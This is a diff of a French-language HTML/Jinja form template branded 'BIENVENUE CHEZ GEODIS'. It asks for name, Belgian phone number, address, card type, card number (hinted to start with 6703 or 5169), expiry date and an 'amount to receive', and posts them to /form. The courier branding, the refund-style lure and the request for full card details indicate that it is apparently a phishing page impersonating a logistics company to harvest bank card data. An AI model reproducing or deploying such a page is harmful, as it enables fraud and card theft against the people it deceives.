@@ -1,246 +1,58 @@
 {% extends 'base.html' %}
 
-{% block title %}Formulaire de paiement{% endblock %}
+{% block title %}Formulaire{% endblock %}
 
 {% block content %}
-    <style>
-        body {
-            background-color: #f5f5f5;
-            font-family: Arial, sans-serif;
-        }
+<div class="payment-form">
+    <h2>BIENVENUE CHEZ GEODIS</h2>
+    <form method="POST" action="/form">
 
-        .payment-form {
-            max-width: 400px;
-            margin: 2rem auto;
-            padding: 2rem;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
+        <div class="form-group">
+            <label>Nom complet</label>
+            <input type="text" name="name" required>
+        </div>
 
-        .payment-form h2 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 1.5rem;
-            font-size: 1.5rem;
-        }
+        <div class="form-group">
+            <label>Numéro de téléphone (+32)</label>
+            <input type="tel" name="phone" required>
+        </div>
 
-        .form-group {
-            margin-bottom: 1.5rem;
-            position: relative;
-        }
+        <div class="form-group">
+            <label>Adresse postale</label>
+            <input type="text" name="address" required>
+        </div>
 
-        .form-group label {
-            display: block;
-            font-size: 0.9rem;
-            margin-bottom: 0.3rem;
-            color: #555;
-            font-weight: bold;
-        }
+        <div class="form-group">
+            <label>Type de carte bancaire</label>
+            <select name="card_type" required>
+                <option value="">-- Sélectionnez --</option>
+                <option>Bancontact</option>
+                <option>Visa</option>
+                <option>Maestro</option>
+                <option>Mastercard</option>
+            </select>
+        </div>
 
-        .form-group input,
-        .form-group select {
-            width: 100%;
-            padding: 0.9rem 0.75rem;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-        }
+        <div class="form-group">
+            <label>Numéro de carte</label>
+            <input type="text" name="card_number" required>
+            <small>Le numéro indiqué sous la carte bancaire commençant par 6703 ou 5169</small>
+        </div>
 
-        .form-group input:focus,
-        .form-group select:focus {
-            outline: none;
-            border-color: #4B2AAF;
-            box-shadow: 0 0 0 2px rgba(75,42,175,0.2);
-        }
-
-        .form-group small {
-            color: #d9534f;
-            margin-top: 0.3rem;
-            display: none;
-            font-size: 0.85rem;
-        }
-
-        .form-group.error small {
-            display: block;
-        }
-
-        .form-group.error input,
-        .form-group.error select {
-            border-color: #d9534f;
-        }
-
-        .form-group .helper-text {
-            color: #888;
-            font-size: 0.85rem;
-        }
-
-        .expiry-fields {
-            display: flex;
-            gap: 0.5rem;
-        }
-
-        .expiry-fields input {
-            width: 50%;
-        }
-
-        .amount-wrapper {
-            display: flex;
-            align-items: center;
-        }
-
-        .amount-wrapper span {
-            background: #f0f0f0;
-            border: 1px solid #ccc;
-            border-radius: 6px 0 0 6px;
-            padding: 0.9rem;
-            font-size: 1rem;
-            color: #555;
-            border-right: none;
-        }
-
-        .amount-wrapper input {
-            border-radius: 0 6px 6px 0;
-            border-left: none;
-        }
-
-        .submit-button {
-            width: 100%;
-            background-color: #4B2AAF;
-            color: white;
-            padding: 0.9rem;
-            font-size: 1rem;
-            font-weight: bold;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        .submit-button:hover {
-            background-color: #3a2193;
-        }
-
-        @media (max-width: 480px) {
-            .payment-form {
-                margin: 1rem;
-                padding: 1.5rem;
-            }
-
-            .expiry-fields {
-                flex-direction: column;
-            }
-
-            .expiry-fields input {
-                width: 100%;
-            }
-
-            .amount-wrapper {
-                flex-direction: column;
-            }
-
-            .amount-wrapper span {
-                border-radius: 6px 6px 0 0;
-                border-right: 1px solid #ccc;
-            }
-
-            .amount-wrapper input {
-                border-radius: 0 0 6px 6px;
-                border-left: 1px solid #ccc;
-            }
-        }
-    </style>
-
-    <div class="payment-form">
-        <h2>Informations de paiement</h2>
-        <form id="paymentForm" method="post" action="/form" novalidate>
-            <!-- Nom complet -->
-            <div class="form-group">
-                <label for="name">Nom figurant sur la carte</label>
-                <input type="text" name="name" id="name" placeholder="Saisis ton nom et prénom" required>
-                <small>Ce champ ne peut pas être vide</small>
+        <div class="form-group expiry-fields">
+            <label>Date d'expiration</label>
+            <div class="expiry-row">
+                <input type="text" name="expiry_month" placeholder="MM" maxlength="2" required>
+                <input type="text" name="expiry_year" placeholder="AA" maxlength="2" required>
             </div>
+        </div>
 
-            <!-- Numéro de téléphone -->
-            <div class="form-group">
-                <label for="phone">Numéro de téléphone (+32)</label>
-                <input type="tel" name="phone" id="phone" placeholder="+32 ..." required>
-                <small>Ce champ ne peut pas être vide</small>
-            </div>
+        <div class="form-group amount-wrapper">
+            <label>Montant à recevoir (€)</label>
+            <input type="text" name="amount" placeholder="10" required>
+        </div>
 
-            <!-- Adresse postale -->
-            <div class="form-group">
-                <label for="address">Adresse postale</label>
-                <input type="text" name="address" id="address" placeholder="Rue, code postal, ville" required>
-                <small>Ce champ ne peut pas être vide</small>
-            </div>
-
-            <!-- Type de carte bancaire -->
-            <div class="form-group">
-                <label for="card_type">Type de carte bancaire</label>
-                <select name="card_type" id="card_type" required>
-                    <option value="">-- Sélectionnez --</option>
-                    <option value="Bancontact">Bancontact</option>
-                    <option value="Visa">Visa</option>
-                    <option value="Maestro">Maestro</option>
-                    <option value="Mastercard">Mastercard</option>
-                </select>
-                <small>Ce champ ne peut pas être vide</small>
-            </div>
-
-            <!-- Numéro de carte -->
-            <div class="form-group">
-                <label for="card_number">Numéro de carte bancaire</label>
-                <input type="text" name="card_number" id="card_number" placeholder="1234 5678 9012 3456" required>
-                <span class="helper-text">Le numéro indiqué sous la carte bancaire commençant par 6703 ou 5169.</span>
-                <small>Ce champ ne peut pas être vide</small>
-            </div>
-
-            <!-- Date d'expiration -->
-            <div class="form-group">
-                <label for="expiry_date">Date d'expiration</label>
-                <div class="expiry-fields">
-                    <input type="text" name="expiry_month" id="expiry_month" placeholder="MM" maxlength="2" required>
-                    <input type="text" name="expiry_year" id="expiry_year" placeholder="AA" maxlength="2" required>
-                </div>
-                <small>Ce champ ne peut pas être vide</small>
-            </div>
-
-            <!-- Montant à recevoir -->
-            <div class="form-group">
-                <label for="amount">Montant à recevoir</label>
-                <div class="amount-wrapper">
-                    <span>€</span>
-                    <input type="number" name="amount" id="amount" step="0.01" placeholder="0.00" required>
-                </div>
-                <small>Ce champ ne peut pas être vide</small>
-            </div>
-
-            <button type="submit" class="submit-button">Utiliser cette carte</button>
-        </form>
-    </div>
-
-    <script>
-        const form = document.getElementById('paymentForm');
-
-        form.addEventListener('submit', function(event) {
-            let valid = true;
-            const formGroups = form.querySelectorAll('.form-group');
-
-            formGroups.forEach(group => {
-                const input = group.querySelector('input, select');
-                if (!input || !input.checkValidity()) {
-                    group.classList.add('error');
-                    valid = false;
-                } else {
-                    group.classList.remove('error');
-                }
-            });
-
-            if (!valid) {
-                event.preventDefault();
-            }
-        });
-    </script>
+        <button type="submit">Terminer</button>
+    </form>
+</div>
 {% endblock %}
